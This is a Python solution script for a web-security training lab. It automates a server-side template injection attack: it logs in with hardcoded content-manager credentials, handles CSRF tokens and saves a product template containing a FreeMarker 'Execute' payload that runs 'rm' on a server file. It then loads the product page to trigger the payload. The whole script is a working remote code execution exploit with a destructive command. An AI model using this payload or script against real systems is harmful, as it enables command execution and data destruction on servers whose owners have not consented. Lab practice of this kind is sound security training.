#!/usr/bin/env python3
import requests
import argparse
from bs4 import BeautifulSoup
from urllib.parse import urljoin

PRODUCT_TEMPLATE_PATH = "/product/template"
PRODUCT_PATH = "/product"
DELETE_FILENAME = "/home/carlos/morale.txt"
USERNAME = "content-manager"
PASSWORD = "C0nt3ntM4n4g3r"
PRODUCT_ID = 1

def log_in(session: requests.Session, base_url: str, csrf_token: str):

    login_url = urljoin(base_url, "/login")
    data = {
        "csrf": csrf_token,
        "username": USERNAME,
        "password": PASSWORD
    }

    r = session.post(login_url, data=data, timeout=10)  # Be careful json=data not data=data
    r.raise_for_status()
    return r

def get_csrf_from_html(html: str) -> str:
    soup = BeautifulSoup(html, "html.parser")
    token = soup.find("input", {"name": "csrf"})
    if not token or not token.get("value"):
        raise RuntimeError("CSRF token not found on forgot-password page.")
    return token["value"]

def visit_product_template(sess: requests.Session, base_url: str, product_id: int):
    url = urljoin(base_url, f"{PRODUCT_TEMPLATE_PATH}?productId={product_id}")

    r = sess.get(url, timeout=10)
    r.raise_for_status()
    return r

def visit_product(sess: requests.Session, base_url: str, product_id: int):
    url = urljoin(base_url, f"{PRODUCT_PATH}?productId={product_id}")

    r = sess.get(url, timeout=10)
    r.raise_for_status()
    return r

def save_new_template(sess: requests.Session, base_url: str, csrf_token: str, product_id: int, payload: str):
    url = urljoin(base_url, f"{PRODUCT_TEMPLATE_PATH}?productId={product_id}")
    data = {
        "csrf": csrf_token,
        "template": payload,
        "template-action": "save"
    }

    r = sess.post(url, data=data, timeout=10, verify=False)
    r.raise_for_status()
    return r

def main():
    requests.packages.urllib3.disable_warnings()
    parser = argparse.ArgumentParser(
        description="Lab: Server-side template injection using documentation"
    )
    parser.add_argument("base_url", help="Base URL of the lab.")
    args = parser.parse_args()

    base_url = args.base_url.rstrip("/")
    sess = requests.Session()

    print(f"[*] Base URL: {base_url}")


    # Step 1: Go to the login page "/login" to extract CSRF token
    print(f"[*] Extracting csrf token to log in...\n")
    r = sess.get(base_url + "/login", timeout=10)
    csrf_token = get_csrf_from_html(r.text)
    print(f"[*] csrf token {csrf_token} extracted\n")

    # Step 2: Log in, get session, extract CSRF token
    print(f"[*] Logging in with {USERNAME}:{PASSWORD}...\n")
    r = log_in(sess, base_url, csrf_token)
    csrf_token = get_csrf_from_html(r.text)
    print(f"[*] Logged in as {USERNAME}, csrf token {csrf_token} extracted\n")

    # Step 3: Visit template page to extract CSRF token
    print(f"[*] Visiting template page...\n")
    r = visit_product_template(sess, base_url, PRODUCT_ID)
    csrf_token = get_csrf_from_html(r.text)
    print(f"[*] Template page visited\n")

    # Step 4: Confirm vulnerability exists by sending a payload with mathematical operation 8*8
    # TODO

    # Step 5: Change the template and save (send POST request)
    print(f"[*] Changing template to delete {DELETE_FILENAME} file...\n")
    payload = f'${{"freemarker.template.utility.Execute"?new()("rm {DELETE_FILENAME}")}}'
    save_new_template(sess, base_url, csrf_token, PRODUCT_ID, payload)
    print(f"[*] Template changed\n")

    # Step 6: Visit the post with a new template to trigger template rendering
    print(f"[*] Visiting a post to trigger template rendering...\n")
    visit_product(sess, base_url, PRODUCT_ID)
    print(f"[*] File {DELETE_FILENAME} deleted. See Lab solved.\n")


    print("\n[+] Attack finished. See Lab solved.")


if __name__ == "__main__":
    main()